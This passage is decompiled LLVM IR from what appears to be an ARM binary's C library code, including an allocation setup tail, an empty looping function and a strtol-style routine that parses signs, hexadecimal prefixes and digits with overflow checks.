  br i1 %v2_15e34, label %dec_label_pc_15e34.dec_label_pc_15e64_crit_edge, label %dec_label_pc_15e3c

dec_label_pc_15e34.dec_label_pc_15e64_crit_edge:  ; preds = %dec_label_pc_15e34.thread, %dec_label_pc_15e34
  %v3_15e68.pre = load i32, i32* @global_var_22b1c.636, align 4
  %v3_15e6c.pre = load i32, i32* @global_var_22b20.633, align 4
  %v2_15e70.pre = load i32, i32* @global_var_22b14.632, align 4
  br label %dec_label_pc_15e64

dec_label_pc_15e3c:                               ; preds = %dec_label_pc_15e34
  %v1_15e40 = add i32 %v0_15e3411, 16
  %v2_15e40 = inttoptr i32 %v1_15e40 to i32*
  %v3_15e40 = load i32, i32* %v2_15e40, align 4
  store i32 %v3_15e40, i32* %r3.global-to-local, align 4
  %v1_15e44 = add i32 %v0_15e3411, 8
  %v2_15e44 = inttoptr i32 %v1_15e44 to i32*
  %v3_15e44 = load i32, i32* %v2_15e44, align 4
  store i32 %v3_15e40, i32* @global_var_22b18.634, align 4
  %v1_15e4c = add i32 %v0_15e3411, 20
  %v2_15e4c = inttoptr i32 %v1_15e4c to i32*
  %v3_15e4c = load i32, i32* %v2_15e4c, align 4
  store i32 %v3_15e4c, i32* %r3.global-to-local, align 4
  store i32 %v3_15e4c, i32* @global_var_22b1c.636, align 4
  %v1_15e54 = add i32 %v0_15e3411, 28
  %v2_15e54 = inttoptr i32 %v1_15e54 to i32*
  %v3_15e54 = load i32, i32* %v2_15e54, align 4
  store i32 %v3_15e54, i32* %r3.global-to-local, align 4
  %v2_15e58 = add i32 %v3_15e44, %v0_15e5814
  store i32 %v3_15e54, i32* @global_var_22b20.633, align 4
  store i32 %v2_15e58, i32* @global_var_22b14.632, align 4
  br label %dec_label_pc_15e64

dec_label_pc_15e64:                               ; preds = %dec_label_pc_15e34.dec_label_pc_15e64_crit_edge, %dec_label_pc_15e3c
  %v2_15e70 = phi i32 [ %v2_15e70.pre, %dec_label_pc_15e34.dec_label_pc_15e64_crit_edge ], [ %v2_15e58, %dec_label_pc_15e3c ]
  %v3_15e6c = phi i32 [ %v3_15e6c.pre, %dec_label_pc_15e34.dec_label_pc_15e64_crit_edge ], [ %v3_15e54, %dec_label_pc_15e3c ]
  %v3_15e68 = phi i32 [ %v3_15e68.pre, %dec_label_pc_15e34.dec_label_pc_15e64_crit_edge ], [ %v3_15e4c, %dec_label_pc_15e3c ]
  store i32 %v3_15e6c, i32* %r0.global-to-local, align 4
  %sum = add i32 %v2_15e70, %v3_15e68
  %v2_15e78 = sub i32 0, %sum
  %v1_15e7c = add i32 %v3_15e6c, -1
  %v2_15e80 = and i32 %v1_15e7c, %v2_15e78
  store i32 %v2_15e80, i32* %r3.global-to-local, align 4
  %v2_15e88 = add i32 %v2_15e80, %v3_15e68
  %tmp = icmp ult i32 %v3_15e6c, 4
  br i1 %tmp, label %bb38, label %.thread30

bb38:                                             ; preds = %dec_label_pc_15e64
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 4, i32* @global_var_22b20.633, align 4
  br label %.thread30

.thread30:                                        ; preds = %dec_label_pc_15e64, %bb38
  %v3_15e94 = phi i32 [ 4, %bb38 ], [ %v3_15e6c, %dec_label_pc_15e64 ]
  %v1_15e98 = add i32 %v2_15e88, 223
  %v2_15e9c = add i32 %v1_15e98, %v3_15e94
  %v1_15ea0 = and i32 %v2_15e9c, -4
  store i32 ptrtoint (i8** @global_var_22adc.527 to i32), i32* %r3.global-to-local, align 4
  store i32 %v2_15e88, i32* @global_var_22b1c.636, align 4
  store i32 %v1_15ea0, i32* @global_var_22af0.638, align 4
  %tmp41 = icmp ult i32 %v1_15ea0, 281
  br i1 %tmp41, label %.thread31, label %dec_label_pc_15ebc

.thread31:                                        ; preds = %.thread30
  store i32 ptrtoint (i32* @global_var_227d0.640 to i32), i32* @r0, align 4
  br label %dec_label_pc_15ed8

dec_label_pc_15ebc:                               ; preds = %.thread30
  store i32 0, i32* @r0, align 4
  store i32 192, i32* @r7, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  store i32 -1, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_15ed8

dec_label_pc_15ed8:                               ; preds = %.thread31, %dec_label_pc_15ebc
  %v0_15ed8 = call i32 @function_15d7c()
  store i32 %v0_15ed8, i32* @r4, align 4
  %v2_15ee0 = inttoptr i32 %v0_15ed8 to i32*
  store i32 %v0_15ed8, i32* %v2_15ee0, align 4
  %v1_15ee4 = add i32 %v0_15ed8, 204
  store i32 %v1_15ee4, i32* %r0.global-to-local, align 4
  %v1_15ee8 = call i32 @function_16f9c(i32 %v1_15ee4)
  store i32 %v1_15ee8, i32* %r0.global-to-local, align 4
  %v1_15eec = icmp slt i32 %v1_15ee8, 0
  br i1 %v1_15eec, label %bb39, label %dec_label_pc_15efc

bb39:                                             ; preds = %dec_label_pc_15ed8
  store i32 0, i32* %r3.global-to-local, align 4
  call void @llvm.trap()
  unreachable

dec_label_pc_15efc:                               ; preds = %dec_label_pc_15ed8
  %v2_15eec = icmp eq i32 %v1_15ee8, 0
  br i1 %v2_15eec, label %bb40, label %.thread3

bb40:                                             ; preds = %dec_label_pc_15efc
  store i32 ptrtoint (i8** @global_var_22adc.527 to i32), i32* %r3.global-to-local, align 4
  store i32 1, i32* bitcast (i8** @global_var_22adc.527 to i32*), align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_15efc, %bb40
  %v0_15f0c = load i32, i32* @r4, align 4
  %v1_15f0c = add i32 %v0_15f0c, 28
  store i32 %v1_15f0c, i32* %r0.global-to-local, align 4
  %v1_15f14 = add i32 %v0_15f0c, 136
  %v3_15f18 = inttoptr i32 %v1_15f14 to i32*
  store i32 %v1_15f14, i32* %v3_15f18, align 4
  store i32 ptrtoint (i32* @global_var_22af8.642 to i32), i32* %r3.global-to-local, align 4
  %v0_15f20 = load i32, i32* %r0.global-to-local, align 4
  %v1_15f20 = load i32, i32* @r4, align 4
  %v2_15f20 = add i32 %v1_15f20, 28
  %v3_15f20 = inttoptr i32 %v2_15f20 to i32*
  store i32 %v0_15f20, i32* %v3_15f20, align 4
  %v0_15f24 = load i32, i32* %r3.global-to-local, align 4
  %v1_15f24 = load i32, i32* @r4, align 4
  %v2_15f24 = add i32 %v1_15f24, 156
  %v3_15f24 = inttoptr i32 %v2_15f24 to i32*
  store i32 %v0_15f24, i32* %v3_15f24, align 4
  store i32 %v6_15de8, i32* @r5, align 4
  %v1_15f2c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_15f2c

; uselistorder directives
  uselistorder i32 %v1_15f14, { 1, 0 }
  uselistorder i32 %v0_15ed8, { 0, 2, 1, 3 }
  uselistorder i32 %v2_15e88, { 1, 0 }
  uselistorder i32 %v3_15e6c, { 1, 0, 3, 2 }
  uselistorder i32 %v1_15e24, { 1, 2, 0 }
  uselistorder i32 %v0_15e3411, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 1, 5, 6, 0 }
  uselistorder i32 192, { 5, 2, 3, 4, 0, 1 }
  uselistorder i32 ptrtoint (i8** @global_var_22adc.527 to i32), { 3, 2, 1, 0 }
  uselistorder i32 223, { 4, 3, 0, 1, 2 }
  uselistorder i32* @global_var_22b14.632, { 1, 0, 2, 3 }
  uselistorder i32* @global_var_22b20.633, { 1, 2, 0, 3 }
  uselistorder i32* @global_var_22b1c.636, { 1, 2, 0 }
  uselistorder i32 %arg1, { 0, 2, 1, 3 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_15ed8, { 1, 0 }
  uselistorder label %.thread30, { 1, 0 }
  uselistorder label %dec_label_pc_15e64, { 1, 0 }
  uselistorder label %dec_label_pc_15e34.dec_label_pc_15e64_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_15e2c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15e04, { 1, 0 }
}

define i32 @function_15f40(i32 %arg1) local_unnamed_addr {
dec_label_pc_15f40:
  br label %dec_label_pc_15f48

dec_label_pc_15f48:                               ; preds = %dec_label_pc_15f48, %dec_label_pc_15f40
  br label %dec_label_pc_15f48
}

define i32 @function_15f58(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_15f58:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = trunc i64 %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_0, align 4
  %v6_15f58 = load i32, i32* @r5, align 4
  %v12_15f58 = load i32, i32* @r7, align 4
  %v15_15f58 = load i32, i32* @r8, align 4
  %v18_15f58 = load i32, i32* @sb, align 4
  %v21_15f58 = load i32, i32* @sl, align 4
  %v24_15f58 = load i32, i32* @fp, align 4
  %v0_15f68 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15f68, i32* @sl, align 4
  store i32 %arg3, i32* @r6, align 4
  %tmp235 = icmp ult i32 %tmp, 37
  br i1 %tmp235, label %dec_label_pc_15f88, label %dec_label_pc_16224

dec_label_pc_15f78:                               ; preds = %dec_label_pc_15f88
  %v2_15f94 = inttoptr i32 %v3_15f88 to i8*
  %v3_15f94 = load i8, i8* %v2_15f94, align 1
  %v4_15f94 = zext i8 %v3_15f94 to i32
  store i32 %v4_15f94, i32* @r5, align 4
  %v6_15f94 = add i32 %v3_15f88, 1
  store i32 %v6_15f94, i32* %r2.global-to-local, align 4
  store i32 %v6_15f94, i32* %v2_15f88, align 4
  %v0_15f78 = load i32, i32* @r5, align 4
  %v7_15f7c = icmp eq i32 %v0_15f78, 32
  br i1 %v7_15f7c, label %dec_label_pc_15f88.backedge, label %bb

bb:                                               ; preds = %dec_label_pc_15f78
  %v1_15f78 = add i32 %v0_15f78, -9
  %tmp236 = icmp ugt i32 %v1_15f78, 4
  br i1 %tmp236, label %dec_label_pc_15fbc, label %dec_label_pc_15f88.backedge

dec_label_pc_15f88.backedge:                      ; preds = %dec_label_pc_15fa0, %dec_label_pc_15f78, %bb, %bb177
  %v0_15f88.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_15f88

dec_label_pc_15f88:                               ; preds = %dec_label_pc_15f58, %dec_label_pc_15f88.backedge
  %v2_15f98 = phi i32 [ %v0_15f88.pre, %dec_label_pc_15f88.backedge ], [ %v0_15f68, %dec_label_pc_15f58 ]
  %v1_15f88 = add i32 %v2_15f98, 4
  %v2_15f88 = inttoptr i32 %v1_15f88 to i32*
  %v3_15f88 = load i32, i32* %v2_15f88, align 4
  store i32 %v3_15f88, i32* %r2.global-to-local, align 4
  %v1_15f8c = add i32 %v2_15f98, 104
  %v2_15f8c = inttoptr i32 %v1_15f8c to i32*
  %v3_15f8c = load i32, i32* %v2_15f8c, align 4
  %v3_15f90 = icmp ult i32 %v3_15f88, %v3_15f8c
  br i1 %v3_15f90, label %dec_label_pc_15f78, label %dec_label_pc_15fa0

dec_label_pc_15fa0:                               ; preds = %dec_label_pc_15f88
  store i32 %v2_15f98, i32* %r0.global-to-local, align 4
  %v1_15fa4 = call i32 @function_1677c(i32 %v2_15f98)
  store i32 %v1_15fa4, i32* %r0.global-to-local, align 4
  store i32 %v1_15fa4, i32* @r5, align 4
  %v7_15fb0 = icmp eq i32 %v1_15fa4, 32
  br i1 %v7_15fb0, label %dec_label_pc_15f88.backedge, label %bb177

bb177:                                            ; preds = %dec_label_pc_15fa0
  %v1_15fac = add i32 %v1_15fa4, -9
  %tmp237 = icmp ult i32 %v1_15fac, 5
  br i1 %tmp237, label %dec_label_pc_15f88.backedge, label %dec_label_pc_15fbc

dec_label_pc_15fbc:                               ; preds = %bb177, %bb
  %v0_15fcc24 = phi i32 [ %v1_15fa4, %bb177 ], [ %v0_15f78, %bb ]
  %v7_15fbc = icmp eq i32 %v0_15fcc24, 45
  br i1 %v7_15fbc, label %dec_label_pc_15fd8, label %bb178

bb178:                                            ; preds = %dec_label_pc_15fbc
  %v8_15fc0 = icmp eq i32 %v0_15fcc24, 43
  br i1 %v8_15fc0, label %dec_label_pc_15fd8, label %.thread19

.thread19:                                        ; preds = %bb178
  br label %dec_label_pc_16000

dec_label_pc_15fd8:                               ; preds = %bb178, %dec_label_pc_15fbc
  %storemerge160 = phi i32 [ 45, %dec_label_pc_15fbc ], [ 43, %bb178 ]
  store i32 %storemerge160, i32* @r4, align 4
  %v0_15fd8 = load i32, i32* @sl, align 4
  %v1_15fd8 = add i32 %v0_15fd8, 4
  %v2_15fd8 = inttoptr i32 %v1_15fd8 to i32*
  %v3_15fd8 = load i32, i32* %v2_15fd8, align 4
  store i32 %v3_15fd8, i32* %r2.global-to-local, align 4
  %v1_15fdc = add i32 %v0_15fd8, 104
  %v2_15fdc = inttoptr i32 %v1_15fdc to i32*
  %v3_15fdc = load i32, i32* %v2_15fdc, align 4
  %v3_15fe0 = icmp ult i32 %v3_15fd8, %v3_15fdc
  br i1 %v3_15fe0, label %.thread27, label %dec_label_pc_164a8

.thread27:                                        ; preds = %dec_label_pc_15fd8
  %v2_15fe4 = inttoptr i32 %v3_15fd8 to i8*
  %v3_15fe4 = load i8, i8* %v2_15fe4, align 1
  %v4_15fe4 = zext i8 %v3_15fe4 to i32
  store i32 %v4_15fe4, i32* @r5, align 4
  %v6_15fe4 = add i32 %v3_15fd8, 1
  store i32 %v6_15fe4, i32* %r2.global-to-local, align 4
  store i32 %v6_15fe4, i32* %v2_15fd8, align 4
  br label %dec_label_pc_15ff0

dec_label_pc_15ff0:                               ; preds = %.thread27, %dec_label_pc_164a8
  %v0_15ff0 = load i32, i32* @r4, align 4
  %v7_15ff0 = icmp eq i32 %v0_15ff0, 45
  br i1 %v7_15ff0, label %.thread29, label %bb180

bb180:                                            ; preds = %dec_label_pc_15ff0
  br label %dec_label_pc_16000

.thread29:                                        ; preds = %dec_label_pc_15ff0
  br label %dec_label_pc_16000

dec_label_pc_16000:                               ; preds = %bb180, %.thread29, %.thread19
  %stack_var_-44.1 = phi i32 [ 0, %.thread19 ], [ 0, %bb180 ], [ -1, %.thread29 ]
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %v1_16004 = sub i32 1, %tmp
  store i32 %v1_16004, i32* @r4, align 4
  %v2_16004 = icmp ult i32 %tmp, 2
  br i1 %v2_16004, label %bb181, label %.thread139

.thread139:                                       ; preds = %dec_label_pc_16000
  store i32 0, i32* @r4, align 4
  br label %bb182

bb181:                                            ; preds = %dec_label_pc_16000
  %v2_1600c = icmp eq i32 %tmp, 0
  br i1 %v2_1600c, label %dec_label_pc_160d8, label %bb182

bb182:                                            ; preds = %.thread139, %bb181
  %v0_16024143 = phi i32 [ 0, %.thread139 ], [ %v1_16004, %bb181 ]
  %v8_16010 = icmp eq i32 %tmp, 16
  br i1 %v8_16010, label %dec_label_pc_160d8, label %.dec_label_pc_16018_crit_edge

.dec_label_pc_16018_crit_edge:                    ; preds = %bb182
  %v0_16020.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16018

dec_label_pc_16018:                               ; preds = %.dec_label_pc_16018_crit_edge, %dec_label_pc_160d8
  %v0_16024142 = phi i32 [ %v0_16024143, %.dec_label_pc_16018_crit_edge ], [ %v0_16024144, %dec_label_pc_160d8 ]
  %v0_16020 = phi i32 [ %v0_16020.pre, %.dec_label_pc_16018_crit_edge ], [ %v0_160d8, %dec_label_pc_160d8 ]
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_16020 = add i32 %v0_16020, ptrtoint (i32* @global_var_19fe6.644 to i32)
  %v3_16020 = inttoptr i32 %v2_16020 to i8*
  %v4_16020 = load i8, i8* %v3_16020, align 1
  %v6_16020 = zext i8 %v4_16020 to i32
  store i32 %v6_16020, i32* @r2, align 4
  %v2_16024 = icmp eq i32 %v0_16024142, 0
  br i1 %v2_16024, label %bb184, label %bb183

bb183:                                            ; preds = %dec_label_pc_16018
  store i32 10, i32* %r1.global-to-local, align 4
  br label %bb184

bb184:                                            ; preds = %dec_label_pc_16018, %bb183
  %v0_16030 = phi i32 [ %tmp, %dec_label_pc_16018 ], [ 10, %bb183 ]
  %tmp238 = icmp ugt i32 %v0_16030, %v6_16020
  br i1 %tmp238, label %dec_label_pc_16038, label %dec_label_pc_161d0

dec_label_pc_16038:                               ; preds = %bb184, %dec_label_pc_16104
  %v0_16050 = phi i32 [ %v0_16110, %dec_label_pc_16104 ], [ %v0_16020, %bb184 ]
  %v0_16048 = phi i32 [ %tmp, %dec_label_pc_16104 ], [ %v0_16030, %bb184 ]
  %v7_1603c = icmp eq i32 %v0_16048, 10
  br i1 %v7_1603c, label %dec_label_pc_161a0.preheader, label %dec_label_pc_16048

dec_label_pc_161a0.preheader:                     ; preds = %dec_label_pc_16038
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_161a0

dec_label_pc_16048:                               ; preds = %dec_label_pc_16038
  %v1_16054 = add i32 %v0_16050, add (i32 ptrtoint (i32* @global_var_19fe5.646 to i32), i32 1)
  %v2_16054 = inttoptr i32 %v1_16054 to i8*
  %v3_16054 = load i8, i8* %v2_16054, align 1
  %v4_16054 = zext i8 %v3_16054 to i32
  store i32 %v4_16054, i32* @fp, align 4
  store i32 %v0_16048, i32* %r2.global-to-local, align 4
  %v1_1605c = add i32 %v0_16048, -1
  br label %dec_label_pc_16060

dec_label_pc_16060:                               ; preds = %.thread156, %dec_label_pc_1610c, %dec_label_pc_16048
  %v4_1615c107 = phi i32 [ %v4_16054, %dec_label_pc_16048 ], [ %v4_16114, %dec_label_pc_1610c ], [ %v6_1664c, %.thread156 ]
  %v1_16060 = phi i32 [ %v0_16048, %dec_label_pc_16048 ], [ 8, %dec_label_pc_1610c ], [ 16, %.thread156 ]
  %v0_16060 = phi i32 [ %v1_1605c, %dec_label_pc_16048 ], [ 7, %dec_label_pc_1610c ], [ 15, %.thread156 ]
  %v2_16060 = and i32 %v0_16060, %v1_16060
  store i32 %v2_16060, i32* %r1.global-to-local, align 4
  %v4_16060 = icmp eq i32 %v2_16060, 0
  br i1 %v4_16060, label %dec_label_pc_16070, label %dec_label_pc_1614c.preheader

dec_label_pc_1614c.preheader:                     ; preds = %dec_label_pc_16060
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_1614c

dec_label_pc_16070:                               ; preds = %dec_label_pc_16060
  %v2_16078 = mul i32 %v1_16060, 23
  %v3_1607c = udiv i32 %v2_16078, 32
  store i32 ptrtoint (i32* @global_var_19fdc.648 to i32), i32* %r2.global-to-local, align 4
  %v1_16084 = urem i32 %v3_1607c, 8
  %v2_16088 = add i32 %v1_16084, ptrtoint (i32* @global_var_19fdc.648 to i32)
  %v3_16088 = inttoptr i32 %v2_16088 to i8*
  %v4_16088 = load i8, i8* %v3_16088, align 1
  %v6_16088 = zext i8 %v4_16088 to i32
  store i32 %v6_16088, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_160a4

dec_label_pc_16094:                               ; preds = %.thread34.dec_label_pc_16094_crit_edge, %dec_label_pc_160cc
  %v0_16098 = phi i32 [ %v0_16098.pre, %.thread34.dec_label_pc_16094_crit_edge ], [ %v1_160d0, %dec_label_pc_160cc ]
  %v0_1609c = load i32, i32* @fp, align 4
  %v1_1609c = load i32, i32* @r4, align 4
  %v2_1609c = load i32, i32* @r5, align 4
  %v7_1609c = shl i32 %v1_1609c, %v2_1609c
  %v8_1609c = or i32 %v7_1609c, %v0_1609c
  store i32 %v8_1609c, i32* @r4, align 4
  %v1_160a0 = add i32 %v0_16098, add (i32 ptrtoint (i32* @global_var_19fe5.646 to i32), i32 1)
  %v2_160a0 = inttoptr i32 %v1_160a0 to i8*
  %v3_160a0 = load i8, i8* %v2_160a0, align 1
  %v4_160a0 = zext i8 %v3_160a0 to i32
  store i32 %v4_160a0, i32* @fp, align 4
  br label %dec_label_pc_160a4

dec_label_pc_160a4:                               ; preds = %dec_label_pc_16070, %dec_label_pc_16094
  %v0_162ac122 = phi i32 [ %v6_16088, %dec_label_pc_16070 ], [ %v2_1609c, %dec_label_pc_16094 ]
  %v4_160ac = phi i32 [ %v4_1615c107, %dec_label_pc_16070 ], [ %v4_160a0, %dec_label_pc_16094 ]
  %v0_1624c = phi i32 [ 0, %dec_label_pc_16070 ], [ %v8_1609c, %dec_label_pc_16094 ]
  store i32 %v1_16060, i32* %r1.global-to-local, align 4
  %v2_160a8 = icmp ugt i32 %v0_1624c, 134217726
  %v8_160a8 = icmp eq i32 %v0_1624c, 134217727
  %v2_160ac = xor i1 %v2_160a8, true
  %v3_160ac = or i1 %v8_160a8, %v2_160ac
  br i1 %v3_160ac, label %bb186, label %bb187

bb186:                                            ; preds = %dec_label_pc_160a4
  %v7_160ac = icmp ult i32 %v4_160ac, %v1_16060
  br i1 %v7_160ac, label %dec_label_pc_160b4, label %dec_label_pc_162a4

bb187:                                            ; preds = %dec_label_pc_160a4
  br i1 %v2_160a8, label %dec_label_pc_162a4, label %dec_label_pc_160b4

dec_label_pc_160b4:                               ; preds = %bb186, %bb187
  %v0_160b4 = load i32, i32* @sl, align 4
  %v1_160b4 = add i32 %v0_160b4, 4
  %v2_160b4 = inttoptr i32 %v1_160b4 to i32*
  %v3_160b4 = load i32, i32* %v2_160b4, align 4
  store i32 %v3_160b4, i32* %r2.global-to-local, align 4
  %v1_160b8 = add i32 %v0_160b4, 104
  %v2_160b8 = inttoptr i32 %v1_160b8 to i32*
  %v3_160b8 = load i32, i32* %v2_160b8, align 4
  %v3_160bc = icmp ult i32 %v3_160b4, %v3_160b8
  br i1 %v3_160bc, label %.thread34.dec_label_pc_16094_crit_edge, label %dec_label_pc_160cc

.thread34.dec_label_pc_16094_crit_edge:           ; preds = %dec_label_pc_160b4
  %v2_160c0 = inttoptr i32 %v3_160b4 to i8*
  %v3_160c0 = load i8, i8* %v2_160c0, align 1
  %v4_160c0 = zext i8 %v3_160c0 to i32
  store i32 %v4_160c0, i32* %r0.global-to-local, align 4
  %v6_160c0 = add i32 %v3_160b4, 1
  store i32 %v6_160c0, i32* %r2.global-to-local, align 4
  store i32 %v6_160c0, i32* %v2_160b4, align 4
  %v0_16098.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16094

dec_label_pc_160cc:                               ; preds = %dec_label_pc_160b4
  store i32 %v0_160b4, i32* %r0.global-to-local, align 4
  %v1_160d0 = call i32 @function_1677c(i32 %v0_160b4)
  store i32 %v1_160d0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16094

dec_label_pc_160d8:                               ; preds = %bb181, %bb182
  %v0_16024144 = phi i32 [ %v1_16004, %bb181 ], [ %v0_16024143, %bb182 ]
  %v0_160d8 = load i32, i32* @r5, align 4
  %v7_160d8 = icmp eq i32 %v0_160d8, 48
  br i1 %v7_160d8, label %dec_label_pc_160e0, label %dec_label_pc_16018

dec_label_pc_160e0:                               ; preds = %dec_label_pc_160d8
  %v0_160e0 = load i32, i32* @sl, align 4
  %v1_160e0 = add i32 %v0_160e0, 4
  %v2_160e0 = inttoptr i32 %v1_160e0 to i32*
  %v3_160e0 = load i32, i32* %v2_160e0, align 4
  store i32 %v3_160e0, i32* %r2.global-to-local, align 4
  %v1_160e4 = add i32 %v0_160e0, 104
  %v2_160e4 = inttoptr i32 %v1_160e4 to i32*
  %v3_160e4 = load i32, i32* %v2_160e4, align 4
  %v3_160e8 = icmp ult i32 %v3_160e0, %v3_160e4
  br i1 %v3_160e8, label %.thread36.dec_label_pc_160f8_crit_edge, label %dec_label_pc_16620

.thread36.dec_label_pc_160f8_crit_edge:           ; preds = %dec_label_pc_160e0
  %v2_160ec = inttoptr i32 %v3_160e0 to i8*
  %v3_160ec = load i8, i8* %v2_160ec, align 1
  %v4_160ec = zext i8 %v3_160ec to i32
  store i32 %v4_160ec, i32* @r5, align 4
  %v6_160ec = add i32 %v3_160e0, 1
  store i32 %v6_160ec, i32* @r2, align 4
  store i32 %v6_160ec, i32* %v2_160e0, align 4
  %v0_160f8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_160f8

dec_label_pc_160f8:                               ; preds = %.thread36.dec_label_pc_160f8_crit_edge, %dec_label_pc_16620
  %v0_16110 = phi i32 [ %v0_160f8.pre, %.thread36.dec_label_pc_160f8_crit_edge ], [ %v1_16624, %dec_label_pc_16620 ]
  %v1_160f8 = or i32 %v0_16110, 32
  %v7_160fc = icmp eq i32 %v1_160f8, 120
  br i1 %v7_160fc, label %dec_label_pc_16630, label %dec_label_pc_16104

dec_label_pc_16104:                               ; preds = %dec_label_pc_160f8
  %v0_16104 = load i32, i32* @r4, align 4
  %v2_16104 = icmp eq i32 %v0_16104, 0
  br i1 %v2_16104, label %dec_label_pc_16038, label %dec_label_pc_1610c

dec_label_pc_1610c:                               ; preds = %dec_label_pc_16104
  %v1_16114 = add i32 %v0_16110, add (i32 ptrtoint (i32* @global_var_19fe5.646 to i32), i32 1)
  %v2_16114 = inttoptr i32 %v1_16114 to i8*
  %v3_16114 = load i8, i8* %v2_16114, align 1
  %v4_16114 = zext i8 %v3_16114 to i32
  store i32 %v4_16114, i32* @fp, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16060

dec_label_pc_16134:                               ; preds = %.thread38.dec_label_pc_16134_crit_edge, %dec_label_pc_1617c
  %v0_1613c = phi i32 [ %v0_1613c.pre, %.thread38.dec_label_pc_16134_crit_edge ], [ %v1_16130, %dec_label_pc_1617c ]
  store i32 %v1_16060, i32* %r1.global-to-local, align 4
  %v1_16140 = load i32, i32* @r4, align 4
  %v2_16140 = load i32, i32* @fp, align 4
  %v3_16140 = mul i32 %v1_16140, %v1_16060
  %v4_16140 = add i32 %v2_16140, %v3_16140
  store i32 %v4_16140, i32* @r4, align 4
  %v1_16144 = add i32 %v0_1613c, add (i32 ptrtoint (i32* @global_var_19fe5.646 to i32), i32 1)
  %v2_16144 = inttoptr i32 %v1_16144 to i8*
  %v3_16144 = load i8, i8* %v2_16144, align 1
  %v4_16144 = zext i8 %v3_16144 to i32
  store i32 %v4_16144, i32* @fp, align 4
  br label %dec_label_pc_1614c

dec_label_pc_1614c:                               ; preds = %dec_label_pc_1614c.preheader, %dec_label_pc_16134
  %v0_1641860 = phi i32 [ %v4_1615c107, %dec_label_pc_1614c.preheader ], [ %v4_16144, %dec_label_pc_16134 ]
  %v0_163f4 = phi i32 [ 0, %dec_label_pc_1614c.preheader ], [ %v4_16140, %dec_label_pc_16134 ]
  store i32 %v1_16060, i32* %r2.global-to-local, align 4
  %v3_16158 = icmp ugt i32 %v0_163f4, 119304645
  %v9_16158 = icmp eq i32 %v0_163f4, 119304646
  %v2_1615c = xor i1 %v3_16158, true
  %v3_1615c = or i1 %v9_16158, %v2_1615c
  br i1 %v3_1615c, label %bb189, label %bb190

bb189:                                            ; preds = %dec_label_pc_1614c
  %v7_1615c = icmp ult i32 %v0_1641860, %v1_16060
  br i1 %v7_1615c, label %dec_label_pc_16164, label %dec_label_pc_163f4

bb190:                                            ; preds = %dec_label_pc_1614c
  br i1 %v3_16158, label %.dec_label_pc_163f4_crit_edge, label %dec_label_pc_16164

.dec_label_pc_163f4_crit_edge:                    ; preds = %bb190
  br label %dec_label_pc_163f4

dec_label_pc_16164:                               ; preds = %bb189, %bb190
  %v0_16164 = load i32, i32* @sl, align 4
  %v1_16164 = add i32 %v0_16164, 4
  %v2_16164 = inttoptr i32 %v1_16164 to i32*
  %v3_16164 = load i32, i32* %v2_16164, align 4
  store i32 %v3_16164, i32* %r2.global-to-local, align 4
  %v1_16168 = add i32 %v0_16164, 104
  %v2_16168 = inttoptr i32 %v1_16168 to i32*
  %v3_16168 = load i32, i32* %v2_16168, align 4
  %v3_1616c = icmp ult i32 %v3_16164, %v3_16168
  br i1 %v3_1616c, label %.thread38.dec_label_pc_16134_crit_edge, label %dec_label_pc_1617c

.thread38.dec_label_pc_16134_crit_edge:           ; preds = %dec_label_pc_16164
  %v2_16170 = inttoptr i32 %v3_16164 to i8*
  %v3_16170 = load i8, i8* %v2_16170, align 1
  %v4_16170 = zext i8 %v3_16170 to i32
  store i32 %v4_16170, i32* %r0.global-to-local, align 4
  %v6_16170 = add i32 %v3_16164, 1
  store i32 %v6_16170, i32* %r2.global-to-local, align 4
  store i32 %v6_16170, i32* %v2_16164, align 4
  %v0_1613c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16134

dec_label_pc_1617c:                               ; preds = %dec_label_pc_16164
  store i32 %v0_16164, i32* %r0.global-to-local, align 4
  %v1_16130 = call i32 @function_1677c(i32 %v0_16164)
  store i32 %v1_16130, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16134

dec_label_pc_16188:                               ; preds = %.thread40.dec_label_pc_16188_crit_edge, %dec_label_pc_161cc
  %v0_1619c = phi i32 [ %v0_1619c.pre, %.thread40.dec_label_pc_16188_crit_edge ], [ %v1_16184, %dec_label_pc_161cc ]
  %v0_16188 = load i32, i32* @r4, align 4
  %v3_16188 = mul i32 %v0_16188, 8
  store i32 %v3_16188, i32* @r2, align 4
  %v2_16190 = mul i32 %v0_16188, 10
  %v1_16194 = load i32, i32* @r5, align 4
  %v2_16194 = add i32 %v1_16194, %v2_16190
  %v1_16198 = add i32 %v2_16194, -48
  store i32 %v1_16198, i32* @r4, align 4
  store i32 %v0_1619c, i32* @r5, align 4
  br label %dec_label_pc_161a0

dec_label_pc_161a0:                               ; preds = %dec_label_pc_161a0.preheader, %dec_label_pc_16188
